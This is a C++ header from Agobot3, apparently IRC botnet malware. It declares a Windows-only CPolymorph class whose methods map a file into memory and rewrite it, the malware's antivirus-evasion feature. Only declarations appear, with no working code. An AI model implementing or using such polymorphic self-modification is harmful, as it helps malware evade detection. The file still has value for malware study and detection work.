/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __POLYMORPH_H__
#define __POLYMORPH_H__

#ifdef WIN32
class CPolymorph
{
public:
	CPolymorph();
	CPolymorph(const char *szFile);
	~CPolymorph();

	bool MapFile(const char *szFile, char **szBuffer);
	void UnmapFile(char **szBuffer);

	bool DoPolymorph(const char *szFile);
};
#endif // WIN32

#endif // __POLYMORPH_H__
